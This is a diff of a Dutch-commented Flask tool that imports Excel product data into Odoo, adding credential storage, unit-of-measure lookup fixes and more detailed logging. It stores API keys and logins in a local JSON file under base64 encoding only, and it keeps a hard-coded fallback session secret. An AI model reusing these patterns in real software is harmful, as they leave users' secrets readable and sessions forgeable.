@@ -19,7 +19,7 @@ Overige highlights blijven:
 - Translations: base/lang ontkoppeld; duplicates tegengehouden.
 """
 
-import os, uuid, time, json, logging, xmlrpc.client, requests, re, base64, threading, random, gc
+import os, uuid, time, json, logging, xmlrpc.client, requests, re, base64, threading, random, gc, sys, webbrowser
 from io import BytesIO
 from decimal import Decimal, InvalidOperation, ROUND_HALF_UP
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -28,6 +28,7 @@ from collections import defaultdict
 
 import pandas as pd
 import openpyxl
+from openpyxl import load_workbook
 from PIL import Image
 
 from flask import Flask, request, render_template, redirect, url_for, session, jsonify, Response
@@ -38,7 +39,14 @@ from werkzeug.exceptions import ClientDisconnected
 # -----------------------------------------------------------------------------
 # Flask & logging
 # -----------------------------------------------------------------------------
-app = Flask(__name__, template_folder="templates", static_folder="static")
+if getattr(sys, 'frozen', False):
+    # PyInstaller creates a temp folder and stores path in _MEIPASS
+    base_dir = sys._MEIPASS
+    template_folder = os.path.join(base_dir, 'templates')
+    static_folder = os.path.join(base_dir, 'static')
+    app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)
+else:
+    app = Flask(__name__, template_folder="templates", static_folder="static")
 app.secret_key = os.environ.get("APP_SECRET", "supersecretkey")
 app.config["SESSION_TYPE"] = "filesystem"
 app.config["JSON_AS_ASCII"] = False
@@ -104,6 +112,53 @@ def _normalize_url(u: str) -> str:
     if s.startswith("//"):
         return "https:" + s
     return s
+
+# -----------------------------------------------------------------------------
+# Credentials storage (voor "Onthoud mij" functionaliteit)
+# -----------------------------------------------------------------------------
+CREDENTIALS_FILE = "credentials.json"
+
+def save_credentials(url, db, email, api_key):
+    """Sla login credentials op met basic encoding."""
+    try:
+        data = {
+            "url": base64.b64encode(url.encode()).decode() if url else "",
+            "db": base64.b64encode(db.encode()).decode() if db else "",
+            "email": base64.b64encode(email.encode()).decode() if email else "",
+            "api_key": base64.b64encode(api_key.encode()).decode() if api_key else ""
+        }
+        with open(CREDENTIALS_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2)
+        logger.info("Credentials opgeslagen")
+    except Exception as e:
+        logger.warning(f"Kon credentials niet opslaan: {e}")
+
+def load_credentials():
+    """Laad opgeslagen credentials."""
+    try:
+        if not os.path.exists(CREDENTIALS_FILE):
+            return None
+        with open(CREDENTIALS_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        return {
+            "url": base64.b64decode(data.get("url", "")).decode() if data.get("url") else "",
+            "db": base64.b64decode(data.get("db", "")).decode() if data.get("db") else "",
+            "email": base64.b64decode(data.get("email", "")).decode() if data.get("email") else "",
+            "api_key": base64.b64decode(data.get("api_key", "")).decode() if data.get("api_key") else ""
+        }
+    except Exception as e:
+        logger.warning(f"Kon credentials niet laden: {e}")
+        return None
+
+def clear_credentials():
+    """Verwijder opgeslagen credentials."""
+    try:
+        if os.path.exists(CREDENTIALS_FILE):
+            os.remove(CREDENTIALS_FILE)
+            logger.info("Credentials verwijderd")
+    except Exception as e:
+        logger.warning(f"Kon credentials niet verwijderen: {e}")
+
 
 # -----------------------------------------------------------------------------
 # XML-RPC transport (keep-alive + pooling + gzip + 429 jitter)
@@ -520,36 +575,96 @@ class UoMResolver:
 
     def get(self, models, db, uid, key, raw, ctx=None):
         global CACHE
-        if not raw: return None
-        raw_s = str(raw).strip()
-        n = _norm(raw_s)
+        
+        # 0) Cache default ST
+        if "DEFAULT_UNIT" not in CACHE.uom_by_norm:
+            unit_id = _get_xml_id(models, db, uid, key, "uom", "product_uom_unit")
+            if unit_id:
+                CACHE.uom_by_norm["DEFAULT_UNIT"] = unit_id
+
+        s_raw = str(raw or "").strip()
+        if not s_raw:
+            return CACHE.uom_by_norm.get("DEFAULT_UNIT")
+
+        n = _norm(s_raw)
+
+        # 1) Hard alias voor 'ST' en varianten -> altijd ST
+        ST_ALIASES = {"st", "stuk", "stuks", "unit", "units", "ea", "piece", "pieces"}
+        if n in ST_ALIASES:
+            return CACHE.uom_by_norm.get("DEFAULT_UNIT")
+
+        # 2) XML-ID direct
+        if "." in s_raw and "/" not in s_raw and " " not in s_raw:
+            parts = s_raw.split(".")
+            if len(parts) == 2:
+                xml_id_res = _get_xml_id(models, db, uid, key, parts[0], parts[1])
+                if xml_id_res:
+                    return xml_id_res
+
+        # 3) Cache lookup
         if n in CACHE.uom_by_norm:
             return CACHE.uom_by_norm[n]
-        if n in CACHE.uom_alias_by_norm:
-            alias_key = CACHE.uom_alias_by_norm[n]
-            if alias_key in CACHE.uom_by_norm:
-                return CACHE.uom_by_norm[alias_key]
-        stripped = re.sub(r"\(.*?\)", "", raw_s).strip()
-        if stripped and _norm(stripped) in CACHE.uom_by_norm:
-            return CACHE.uom_by_norm[_norm(stripped)]
-        try:
-            res = retry(models.execute_kw, db, uid, key, "uom.uom", "name_search",
-                        [raw_s], {"operator":"ilike","limit":1,"context":(ctx or {})})
-            if res:
-                hit = int(_coerce_id(res[0][0]))
-                CACHE.uom_by_norm[_norm(raw_s)] = hit
-                return hit
-        except Exception:
-            pass
+
+        # 4) Exacte naam (current lang)
         try:
             ids = retry(models.execute_kw, db, uid, key, "uom.uom", "search",
-                        [[("name","ilike",raw_s)]], {"limit":1,"context":(ctx or {})})
+                        [[('name', '=', s_raw)]], {"limit": 1, "context": (ctx or {})})
             if ids:
-                hit = int(_coerce_id(ids[0]))
-                CACHE.uom_by_norm[_norm(raw_s)] = hit
+                hit = int(ids[0])
+                CACHE.uom_by_norm[n] = hit
                 return hit
         except Exception:
             pass
+
+        # 5) Exacte naam (en_US)
+        try:
+            en_ctx = (ctx or {}).copy()
+            en_ctx['lang'] = 'en_US'
+            ids = retry(models.execute_kw, db, uid, key, "uom.uom", "search",
+                        [[('name', '=', s_raw)]], {"limit": 1, "context": en_ctx})
+            if ids:
+                hit = int(ids[0])
+                CACHE.uom_by_norm[n] = hit
+                return hit
+        except Exception:
+            pass
+
+        # 6) Brede zoek — kies beste kandidaat (exact LOWER, anders factor ~ 1)
+        try:
+            # eerst enkele kandidaten ophalen
+            ids = retry(models.execute_kw, db, uid, key, "uom.uom", "search",
+                        [[('name', 'ilike', s_raw)]], {"limit": 10, "context": (ctx or {})})
+            if ids:
+                recs = retry(models.execute_kw, db, uid, key, "uom.uom", "read",
+                             [ids, ["name", "factor", "factor_inv"]])
+                
+                # Calculate relative_factor (factor or 1/factor_inv)
+                for r in recs:
+                    factor = r.get("factor") or 0.0
+                    factor_inv = r.get("factor_inv") or 1.0
+                    # relative_factor = factor if factor else (1.0 / factor_inv if factor_inv else 1.0)
+                    if factor > 0:
+                        r["relative_factor"] = factor
+                    elif factor_inv > 0:
+                        r["relative_factor"] = 1.0 / factor_inv
+                    else:
+                        r["relative_factor"] = 1.0
+                
+                # ranking: exact lower() eerst; anders dichtsbij 1.0 (verpakt 10x/6x valt af)
+                s_low = s_raw.lower()
+                recs.sort(key=lambda r: (
+                    0 if (r.get("name") or "").lower() == s_low else 1,
+                    abs((r.get("relative_factor") or 0.0) - 1.0),
+                    len(r.get("name") or ""),
+                    r["id"],
+                ))
+                hit = int(recs[0]["id"])
+                CACHE.uom_by_norm[n] = hit
+                return hit
+        except Exception as e:
+            logging.warning(f"Broad search failed for '{s_raw}': {e}")
+
+        logging.warning(f"⚠️ UoM '{s_raw}' niet gevonden. Gebruik bij voorkeur XML-ID, bv. uom.product_uom_unit.")
         return None
 
 UOM = UoMResolver()
@@ -594,6 +709,17 @@ def _relation_char_buckets(meta_fields):
     if "code" in codeish:
         codeish.insert(0, codeish.pop(codeish.index("code")))
     return codeish, nameish, others
+
+# NEW: XML ID Helper
+def _get_xml_id(models, db, uid, key, module, name):
+    try:
+        res = retry(models.execute_kw, db, uid, key, "ir.model.data", "search_read",
+                    [[("module", "=", module), ("name", "=", name)]], {"fields": ["res_id"], "limit": 1})
+        if res:
+            return int(res[0]["res_id"])
+    except Exception:
+        pass
+    return None
 
 def _name_search(models, db, uid, key, relation, value, company_id=None, limit=1):
     try:
@@ -826,9 +952,16 @@ def resolve_dynamic_field(models, db, uid, key, field_name, raw, company_id=None
     # Many2one
     if ftype == "many2one":
         rel = meta.get("relation")
+        # FIX: Ensure relation is a string, not a list
+        if isinstance(rel, (list, tuple)):
+            rel = rel[0] if rel else ""
+        rel = str(rel) if rel else ""
 
         # UoM shortcut
         if pure_field_name in ("uom_id", "uom_po_id"):
+            # Check if the field exists before resolving
+            if not model_has_field(models, db, uid, key, "product.template", pure_field_name):
+                return (False, None)
             uom_id = UOM.get(models, db, uid, key, raw, company_ctx(company_id))
             return (False, uom_id)
 
@@ -861,6 +994,11 @@ def resolve_dynamic_field(models, db, uid, key, field_name, raw, company_id=None
     # Many2many / One2many
     if ftype in ("many2many", "one2many"):
         rel = meta.get("relation")
+        # FIX: Ensure relation is a string, not a list
+        if isinstance(rel, (list, tuple)):
+            rel = rel[0] if rel else ""
+        rel = str(rel) if rel else ""
+        
         s = str(raw or "")
         if not s.strip():
             return (True, [])
@@ -1098,20 +1236,26 @@ def get_or_create_category(models, db, uid, key, path, company_id=None, model_na
         ids = retry(models.execute_kw, db, uid, key, model_name, "search",
                     [dom], {"limit": 1, "context": company_ctx(company_id)})
         if ids:
-            parent_id = ids[0]; continue
+            parent_id = int(_coerce_id(ids[0]))
+            continue
         vals = {"name": seg, "parent_id": int(_coerce_id(parent_id)) if parent_id else False}
         if model_name == "product.category" and company_id and model_has_field(models, db, uid, key, "product.category", "company_id"):
             vals["company_id"] = int(_coerce_id(company_id))
         try:
-            parent_id = retry(models.execute_kw, db, uid, key, model_name, "create",
+            new_id = retry(models.execute_kw, db, uid, key, model_name, "create",
                               [[vals]], {"context": company_ctx(company_id)})
+            parent_id = int(_coerce_id(new_id))
         except xmlrpc.client.Fault:
             ids2 = retry(models.execute_kw, db, uid, key, model_name, "search",
                          [dom], {"limit": 1, "context": company_ctx(company_id)})
-            if ids2: parent_id = ids2[0]
+            if ids2: 
+                parent_id = int(_coerce_id(ids2[0]))
             else: raise
-    CACHE.categories[norm_key] = parent_id
-    return parent_id
+    
+    # CRITICAL: Ensure we return an integer, not a list
+    final_id = int(_coerce_id(parent_id))
+    CACHE.categories[norm_key] = final_id
+    return final_id
 
 def get_or_create_supplier(models, db, uid, key, supplier_name, company_id=None):
     global CACHE
@@ -1124,9 +1268,12 @@ def get_or_create_supplier(models, db, uid, key, supplier_name, company_id=None)
     ids = retry(models.execute_kw, db, uid, key, "res.partner", "search",
                 [dom], {"limit": 1, "context": company_ctx(company_id)})
     if ids:
-        CACHE.partner_by_name[k] = ids[0]; return ids[0]
+        pid = int(_coerce_id(ids[0]))
+        CACHE.partner_by_name[k] = pid
+        return pid
     nid = retry(models.execute_kw, db, uid, key, "res.partner", "create",
                 [[{"name": name, "supplier_rank": 1}]], {"context": company_ctx(company_id)})
+    nid = int(_coerce_id(nid))
     CACHE.partner_by_name[k] = nid
     return nid
 
@@ -2260,20 +2407,31 @@ def prefetch_suppliers(models, db, uid, key, supplier_names, company_id):
 # -----------------------------------------------------------------------------
 def pick_storable_selection_key(selection):
     """
-    Kies een geldige selection-key voor 'storable/stockable' type,
-    op basis van wat Odoo in jouw omgeving echt ondersteunt.
+    Kies een geldige selection-key voor 'storable/stockable' type.
+    Prioriteer 'product' (Odoo default) of keywords.
+    Vermijd 'consu'/'service' tenzij expliciet gevraagd (hier niet het geval).
     """
     if not selection:
         return None
-    want = coerce_user_type_value(selection, "product")
-    if want is not None:
-        return want
+        
+    # 1. Exact 'product' check (standard Odoo)
+    for key, label in selection:
+        if str(key) == "product":
+            return key
+            
+    # 2. 'storable' or 'stockable' in key or label
     for key, label in selection:
         k = str(key).lower()
         l = str(label or "").lower()
-        if any(tok in k for tok in ("product", "stock", "storable")) or any(tok in l for tok in ("product", "stock", "storable")):
+        # Skip explicitly non-storable types if we are fuzzy matching
+        if k in ("consu", "service"): continue
+        
+        if "product" in k or "storable" in k or "stock" in k:
             return key
-    return selection[0][0]
+        if "product" in l or "storable" in l or "stock" in l:
+            return key
+            
+    return None
 
 def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping, options):
     """Kernprocessor met openpyxl STREAMING + batches — memory efficient."""
@@ -2287,6 +2445,49 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
     def log(msg): job.push(sse_format("log", msg))
     def check_cancel():
         if job.is_cancelled(): raise RuntimeError("Job cancelled door gebruiker")
+    
+    def log_product_update(pid, product_name, product_ref, fields_dict):
+        """Log gedetailleerde product update informatie"""
+        if not fields_dict:
+            return
+        
+        name_str = f'"{product_name}"' if product_name else ""
+        ref_str = f'[{product_ref}]' if product_ref else ""
+        log(f"📦 Product {pid} {name_str} {ref_str}:")
+        
+        # Belangrijke velden met waarde tonen
+        important_fields = {
+            "name": "Naam", 
+            "default_code": "Referentie", 
+            "list_price": "Verkoopprijs", 
+            "standard_price": "Kostprijs",
+            "barcode": "Barcode", 
+            "sale_ok": "Verkoopbaar", 
+            "purchase_ok": "Aankoopbaar", 
+            "is_published": "Gepubliceerd",
+            "categ_id": "Categorie",
+            "uom_id": "Verkoop UoM",
+            "uom_po_id": "Aankoop UoM"
+        }
+        
+        shown_fields = []
+        for field, value in fields_dict.items():
+            if field in important_fields:
+                label = important_fields[field]
+                # Format value voor betere leesbaarheid
+                if isinstance(value, bool):
+                    val_str = "Ja" if value else "Nee"
+                elif isinstance(value, (int, float)) and field in ("list_price", "standard_price"):
+                    val_str = f"€{value:.2f}"
+                else:
+                    val_str = str(value)
+                log(f"  ✏️ {label}: {val_str}")
+                shown_fields.append(field)
+        
+        # Andere velden alleen tellen
+        other_count = len([f for f in fields_dict.keys() if f not in shown_fields])
+        if other_count > 0:
+            log(f"  ✏️ (+{other_count} andere velden bijgewerkt)")
 
     # --- Helper voor streaming ---
     def read_excel_chunks(fpath, sname, size):
@@ -2379,6 +2580,34 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
         ptype_field, ptype_selection = product_type_field_and_selection(models, db, uid, key)
         log(f"ptype_field={ptype_field}")
 
+        # Get default UoM "ST" (stuks/pieces) for when uom_id/uom_po_id are not mapped
+        default_uom_id = None
+        has_uom_id = model_has_field(models, db, uid, key, "product.template", "uom_id")
+        has_uom_po_id = model_has_field(models, db, uid, key, "product.template", "uom_po_id")
+        
+        log(f"UoM velden beschikbaar: uom_id={has_uom_id}, uom_po_id={has_uom_po_id}")
+        
+        log(f"UoM velden beschikbaar: uom_id={has_uom_id}, uom_po_id={has_uom_po_id}")
+        
+        if has_uom_id or has_uom_po_id:
+            try:
+                # STRICT: Use XML ID for default fallback
+                default_uom_id = _get_xml_id(models, db, uid, key, "uom", "product_uom_unit")
+                
+                if default_uom_id:
+                    log(f"✓ Default UoM (fallback) ingesteld via XML-ID: {default_uom_id}")
+                else:
+                    # Fallback search if XML ID fails (rare)
+                    for candidate in ["ST", "st", "stuks", "Stuks", "Units", "units"]:
+                        uom_id = UOM.get(models, db, uid, key, candidate, company_ctx(chosen_company_id))
+                        if uom_id:
+                            default_uom_id = uom_id
+                            break
+            except Exception as e:
+                log(f"⚠️ Kon default UoM niet ophalen: {e}")
+
+
+
         has_doc_show_generic = any(v == "product_document_ids/shown_on_product_page" for v in mapping.values())
         has_doc_show_1 = any(v == "document_show_on_website_1" for v in mapping.values())
         has_doc_show_2 = any(v == "document_show_on_website_2" for v in mapping.values())
@@ -2388,6 +2617,31 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
         # ---------------------------------------------------------
         processed_count = 0
         chunk_idx = 0
+        
+        # Count total rows for progress tracking - ROBUST METHOD
+        total_rows = 0
+        try:
+            wb_count = load_workbook(file_path, read_only=True, data_only=True)
+            ws_count = wb_count[sheet_name]
+            # max_row is unreliable in read_only mode, so we iterate
+            for _ in ws_count.iter_rows():
+                total_rows += 1
+            wb_count.close()
+            
+            total_rows = max(0, total_rows - 1) # Subtract header
+            
+            if total_rows > 0:
+                total_chunks = (total_rows + CHUNK_SIZE - 1) // CHUNK_SIZE
+                log(f"📊 Totaal te verwerken: {total_rows} rijen in ~{total_chunks} chunks")
+            
+            # CRITICAL: Inform job state and frontend about total
+            job.set_progress(total=total_rows)
+            job.push(sse_format("progress", {"processed": 0, "total": total_rows}))
+
+        except Exception as e:
+            log(f"⚠️ Kon totaal aantal rijen niet bepalen: {e}")
+            total_rows = 0
+            total_chunks = 0
         
         excel_stream = read_excel_chunks(file_path, sheet_name, CHUNK_SIZE)
         map_get = mapping.get
@@ -2458,7 +2712,9 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
                     field = map_get(col) or ""
                     field = str(field or "").strip()
                     if not field or field.lower() in ("","undefined","null"): continue
-                    if raw in (None, ""): continue
+                    
+                    # Allow empty values for UoM fields to support "always on blank" fallback
+                    if raw in (None, "") and field not in ("uom_id", "uom_po_id"): continue
 
                     is_trans_col = False
                     for rx in TRANSLATION_COL_REGEXES:
@@ -2599,26 +2855,31 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
                             translations_by_lang[base_lang].pop(k, None)
 
                 product_id = None
+                matched_by_barcode = False
                 bc = (base_vals.get("barcode") or "").strip()
                 nm = (base_vals.get("name") or "").strip()
-                if bc and bc in CACHE.barcode_to_id: product_id = CACHE.barcode_to_id[bc]
-                elif bc and bc.lstrip("0") in CACHE.barcode_to_id: product_id = CACHE.barcode_to_id[bc.lstrip("0")]
+                
+                # 1. Lookup by Barcode
+                if bc and bc in CACHE.barcode_to_id: 
+                    product_id = CACHE.barcode_to_id[bc]
+                    matched_by_barcode = True
+                elif bc and bc.lstrip("0") in CACHE.barcode_to_id: 
+                    product_id = CACHE.barcode_to_id[bc.lstrip("0")]
+                    matched_by_barcode = True
+                
+                # 2. Lookup by Name (if not found by barcode)
                 if not product_id and nm:
                     hit = CACHE.name_to_id.get(nm.lower())
                     if hit: product_id = hit
                 
-                if not product_id and not nm:
-                    gen_name = None
-                    if supplier_name and supplier_code: gen_name=f"{supplier_name.strip()} {supplier_code.strip()}"
-                    elif bc: gen_name=f"ITEM-{bc}"
-                    elif supplier_code: gen_name=f"ITEM-{supplier_code}"
-                    if gen_name: 
-                        base_vals.setdefault("name", gen_name)
-                        nm = gen_name
-                
+                # REVERTED: "Als de naam gemapped wordt, moet deze ook aangepast worden"
+                # We do NOT remove "name" from base_vals anymore.
+
+                # 3. New Product Validation: Name required (Barcode optional)
                 if not product_id:
-                     if not base_vals.get("name"):
-                         log(f"Skipping row {row_abs_index}: no name"); continue
+                     if not nm:
+                         log(f"⚠️ Skipping row {row_abs_index}: nieuwe producten vereisen minimaal een Naam (gevonden: naam='{nm}', barcode='{bc}')")
+                         continue
                      if ptype_field:
                          if not base_vals.get(ptype_field):
                               chosen = pick_storable_selection_key(ptype_selection)
@@ -2629,8 +2890,28 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
                              if chosen: base_vals[ptype_field]=chosen
                      if chosen_company_id and model_has_field(models, db, uid, key, "product.template", "company_id"):
                           base_vals.setdefault("company_id", int(_safe_int(chosen_company_id)))
+
+                     # Set default UoM if not already set (only if fields exist)
+                     if default_uom_id:
+                         if has_uom_id and not base_vals.get("uom_id"):
+                             base_vals["uom_id"] = default_uom_id
+                         if has_uom_po_id and not base_vals.get("uom_po_id"):
+                             base_vals["uom_po_id"] = default_uom_id
+
                      cvals = {k:v for k,v in base_vals.items() if v!="__USE_CATEGORY__"}
                      create_payloads.append((i, cvals))
+
+                # Force storable if stock is provided (fix for existing products + new ones if logic missed it)
+                # Force storable if stock is provided (fix for existing products + new ones if logic missed it)
+                if ptype_field and not base_vals.get(ptype_field):
+                    if stock_qty is not None:
+                        chosen = pick_storable_selection_key(ptype_selection)
+                        if chosen: 
+                            base_vals[ptype_field] = chosen
+                        else: 
+                            # Force fallback: use is_storable boolean
+                            base_vals["is_storable"] = True
+                            log(f"⚠️ Geen storable optie in '{ptype_field}'. Zet is_storable=True.")
 
                 rows_data.append({
                     "local_idx": i, "product_id": product_id,
@@ -2655,6 +2936,25 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
                 for cbatch in create_batches:
                     check_cancel()
                     vals_list = [v for (_,v) in cbatch]
+                    
+                    # SAFETY: Remove invalid fields (like uom_po_id if it doesn't exist)
+                    # Get valid fields once per batch for efficiency
+                    try:
+                        product_fields = _fields_get_cached(models, db, uid, key, "product.template")
+                        valid_field_names = set(product_fields.keys())
+                        
+                        # Filter each vals dict to only include valid fields
+                        filtered_vals_list = []
+                        for vals in vals_list:
+                            filtered_vals = {k: v for k, v in vals.items() if k in valid_field_names}
+                            removed_fields = set(vals.keys()) - set(filtered_vals.keys())
+                            if removed_fields:
+                                log(f"⚠️ Verwijderde ongeldige velden: {', '.join(removed_fields)}")
+                            filtered_vals_list.append(filtered_vals)
+                        vals_list = filtered_vals_list
+                    except Exception as e:
+                        log(f"⚠️ Kon velden niet valideren: {e}")
+                    
                     try:
                         ids = retry(models.execute_kw, db, uid, key, "product.template", "create", [vals_list], base_write_ctx)
                         if isinstance(ids, int): ids=[ids]
@@ -2736,10 +3036,36 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
                      if k==base_lang: 
                          for f, val in v.items(): combined[f]=val
                 
+                # Set default UoM for existing products if not already present in update data (only if fields exist)
+                if default_uom_id:
+                    if has_uom_id and not combined.get("uom_id"):
+                        combined["uom_id"] = default_uom_id
+                    if has_uom_po_id and not combined.get("uom_po_id"):
+                        combined["uom_po_id"] = default_uom_id
+                
                 if d["supplier_name"] and combined.get("purchase_ok") is None: combined["purchase_ok"]=True
                 
+                # SAFETY: Filter invalid fields before write
                 if combined:
-                    try: retry(models.execute_kw, db, uid, key, "product.template", "write", [ensure_ids_list(pid), combined], {"context":company_ctx(comp_id, lang=base_lang)})
+                    try:
+                        product_fields = _fields_get_cached(models, db, uid, key, "product.template")
+                        valid_field_names = set(product_fields.keys())
+                        filtered_combined = {k: v for k, v in combined.items() if k in valid_field_names}
+                        removed = set(combined.keys()) - set(filtered_combined.keys())
+                        if removed:
+                            log(f"⚠️ Verwijderde ongeldige update velden: {', '.join(removed)}")
+                        combined = filtered_combined
+                    except Exception:
+                        pass
+                
+                if combined:
+                    try: 
+                        # Log product update details
+                        product_name = combined.get("name", d["base_vals"].get("name", ""))
+                        product_ref = combined.get("default_code", d["base_vals"].get("default_code", ""))
+                        log_product_update(pid, product_name, product_ref, combined)
+                        
+                        retry(models.execute_kw, db, uid, key, "product.template", "write", [ensure_ids_list(pid), combined], {"context":company_ctx(comp_id, lang=base_lang)})
                     except Exception as e: log(f"Write error pid {pid}: {e}")
                 
                 if d["base_vals"].get("property_account_income_id")=="__USE_CATEGORY__":
@@ -2750,6 +3076,7 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
                 for lang_code, tvals in (d["translations_by_lang"] or {}).items():
                     if lang_code==base_lang: continue
                     if tvals:
+                         log(f"🌐 Vertaling bijwerken voor product {pid} ({lang_code}): {', '.join(tvals.keys())}")
                          retry(models.execute_kw, db, uid, key, "product.template", "write", [ensure_ids_list(pid), tvals], {"context":company_ctx(comp_id, lang=lang_code)})
 
                 for (u, t, s) in [(d["document_url_1"], d["document_title_1"], d["document_show_on_website_1"]),
@@ -2781,6 +3108,7 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
 
                 if d["stock_qty"] is not None:
                      variant_id = tmpl_to_variant.get(pid)
+                     log(f"📦 Stock detected: pid={pid}, stock_qty={d['stock_qty']}, variant_id={variant_id}")
                      if variant_id:
                          lid = None
                          if d["desired_location_path"]: lid = path_to_loc.get((comp_id, d["desired_location_path"]))
@@ -2789,6 +3117,11 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
                              if locs: lid=locs[0]
                          if lid:
                              stock_jobs.append((variant_id, comp_id, lid, float(d["stock_qty"])))
+                             log(f"✅ Stock job added: variant={variant_id}, location={lid}, qty={d['stock_qty']}")
+                         else:
+                             log(f"⚠️ No location found for stock update")
+                     else:
+                         log(f"⚠️ No variant found for template {pid}")
 
                 final_taxes = set(d["mapped_tax_ids"])
                 if d["bebat_id"]: final_taxes.add(d["bebat_id"])
@@ -2805,20 +3138,70 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
             flush_chunk_images()
             
             if supplier_jobs:
-                 s_tmpl_ids = list(set([j[0] for j in supplier_jobs]))
-                 s_part_ids = list(set([j[2] for j in supplier_jobs]))
+                 s_tmpl_ids = list(set([int(_coerce_id(j[0])) for j in supplier_jobs]))
+                 # FIX: Ensure partner_ids are integers, not lists
+                 s_part_ids = list(set([int(_coerce_id(j[2])) for j in supplier_jobs]))
+                 
+                 # Get existing supplier info records
                  existing = retry(models.execute_kw, db, uid, key, "product.supplierinfo", "search_read", 
-                     [[("product_tmpl_id","in",s_tmpl_ids),("partner_id","in",s_part_ids)]], {"fields":["id","product_tmpl_id","partner_id","product_code"]})
+                     [[("product_tmpl_id","in",s_tmpl_ids),("partner_id","in",s_part_ids)]], 
+                     {"fields":["id","product_tmpl_id","partner_id","product_code"]})
                  sup_idx = {}
                  for r in existing: sup_idx[(r["product_tmpl_id"][0], r["partner_id"][0], r.get("product_code") or "")] = r["id"]
                  
-                 for (pid, cid, parid, pcode, price, mq, delay) in supplier_jobs:
+                 log(f"📦 Verwerken van {len(supplier_jobs)} leverancierinfo records...")
+                 supplier_success = 0
+                 supplier_skipped = 0
+                 
+                 for idx, (pid, cid, parid, pcode, price, mq, delay) in enumerate(supplier_jobs, 1):
                      k_ = (pid, parid, pcode or "")
                      vals = {"product_tmpl_id":pid, "partner_id":parid, "product_code":pcode or "", "price":price, "min_qty":mq, "delay":delay, "company_id":cid or False}
-                     if k_ in sup_idx:
-                         retry(models.execute_kw, db, uid, key, "product.supplierinfo", "write", [[sup_idx[k_]], vals], {"context":company_ctx(None)})
-                     else:
-                         retry(models.execute_kw, db, uid, key, "product.supplierinfo", "create", [[vals]], {"context":company_ctx(None)})
+                     
+                     # Get product and supplier names for better logging
+                     product_info = ""
+                     supplier_info = ""
+                     try:
+                         p_rec = retry(models.execute_kw, db, uid, key, "product.template", "read", [[pid], ["name", "default_code"]], {"context":company_ctx(cid)})
+                         if p_rec:
+                             p_name = p_rec[0].get("name", "")
+                             p_ref = p_rec[0].get("default_code", "")
+                             product_info = f'{p_name}' + (f' [{p_ref}]' if p_ref else '')
+                     except: pass
+                     
+                     try:
+                         s_rec = retry(models.execute_kw, db, uid, key, "res.partner", "read", [[parid], ["name"]], {"context":company_ctx(cid)})
+                         if s_rec:
+                             supplier_info = s_rec[0].get("name", "")
+                     except: pass
+                     
+                     try:
+                         if k_ in sup_idx:
+                             log(f"🔄 Leverancierinfo bijwerken ({idx}/{len(supplier_jobs)}):")
+                             log(f"   Product: {pid} {product_info}")
+                             log(f"   Leverancier: {parid} {supplier_info}")
+                             log(f"   Prijs: €{price:.2f}, Min. aant: {mq}, Levertijd: {delay} dagen")
+                             retry(models.execute_kw, db, uid, key, "product.supplierinfo", "write", [[sup_idx[k_]], vals], {"context":company_ctx(None)})
+                         else:
+                             log(f"➕ Leverancierinfo aanmaken ({idx}/{len(supplier_jobs)}):")
+                             log(f"   Product: {pid} {product_info}")
+                             log(f"   Leverancier: {parid} {supplier_info}")
+                             log(f"   Prijs: €{price:.2f}, Min. aant: {mq}, Levertijd: {delay} dagen")
+                             retry(models.execute_kw, db, uid, key, "product.supplierinfo", "create", [[vals]], {"context":company_ctx(None)})
+                         supplier_success += 1
+                     except Exception as e:
+                         supplier_skipped += 1
+                         error_msg = str(e)
+                         # Skip supplier info that conflicts with pricelists (POS environments)
+                         if "pricelist" in error_msg.lower() or "another model is using" in error_msg.lower():
+                             log(f"⚠️ Leverancierinfo overgeslagen ({idx}/{len(supplier_jobs)}): product {pid}, leverancier {parid} - pricelist conflict (POS)")
+                         else:
+                             # Show first 200 chars of error for debugging
+                             short_error = error_msg[:200] + "..." if len(error_msg) > 200 else error_msg
+                             log(f"⚠️ Leverancierinfo fout ({idx}/{len(supplier_jobs)}): product {pid}, leverancier {parid} - {short_error}")
+                         continue
+                 
+                 log(f"✅ Leverancierinfo klaar: {supplier_success} succesvol, {supplier_skipped} overgeslagen")
+
 
             for (pid, cid, whc, pac) in putaway_jobs:
                  try:
@@ -2840,21 +3223,66 @@ def process_excel_job(job_id, url, db, uid, key, file_path, sheet_name, mapping,
                      else: retry(models.execute_kw, db, uid, key, "stock.putaway.rule", "create", [[vals]], {"context":company_ctx(cid)})
                  except Exception as e: log(f"Putaway error: {e}")
 
+            log(f"📦 Stock jobs to process: {len(stock_jobs)}")
+            quants_to_apply = []
             for (vid, cid, lid, qty) in stock_jobs:
                  try:
+                     # Get product name for better logging
+                     product_info = ""
+                     try:
+                         v_rec = retry(models.execute_kw, db, uid, key, "product.product", "read", [[vid], ["name", "default_code"]], {"context":company_ctx(cid)})
+                         if v_rec:
+                             v_name = v_rec[0].get("name", "")
+                             v_ref = v_rec[0].get("default_code", "")
+                             product_info = f'{v_name}' + (f' [{v_ref}]' if v_ref else '')
+                     except: pass
+                     
+                     log(f"📦 Voorraad bijwerken: {vid} {product_info}")
+                     log(f"   Locatie: {lid}, Hoeveelheid: {qty}")
+                     
                      q = retry(models.execute_kw, db, uid, key, "stock.quant", "search", [[("product_id","=",vid),("location_id","=",lid)]], {"limit":1, "context":company_ctx(cid)})
-                     if q: retry(models.execute_kw, db, uid, key, "stock.quant", "write", [q, {"inventory_quantity":qty}], {"context":company_ctx(cid)})
